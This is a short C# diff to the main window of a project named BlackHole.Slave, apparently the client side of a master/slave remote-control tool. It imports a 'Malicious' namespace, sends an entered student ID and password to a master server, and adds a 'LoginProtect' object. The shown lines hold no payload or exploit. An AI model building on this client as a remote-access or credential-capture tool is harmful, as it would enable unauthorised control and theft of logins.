@@ -4,9 +4,11 @@ using System.Threading;
 using System.Windows.Forms;
 using BlackHole.Slave.Helper.Native.Impl;
 using BlackHole.Slave.Malicious;
+using System.Timers;
 
 namespace BlackHole.Slave
 {
+    
     /// <summary>
     /// MainWindow.xaml 的交互逻辑
     /// </summary>
@@ -16,6 +18,7 @@ namespace BlackHole.Slave
         public string stuid;
         public string password;
         MasterServer mServer;
+        public LoginProtect loginProtect;
 
         public MainWindow()
         {
@@ -32,7 +35,7 @@ namespace BlackHole.Slave
                     return true;
                 }, true);
                 InitializeComponent();
-                //System.Windows.Forms.Application.Run();
+                loginProtect = new LoginProtect();
             }
             catch (Exception e)
             {
@@ -50,6 +53,7 @@ namespace BlackHole.Slave
             stuid = Stuid.Text;
             password = Password.Text;
             mServer.RequestLogin(stuid, password);
+            
         }
     }
 }
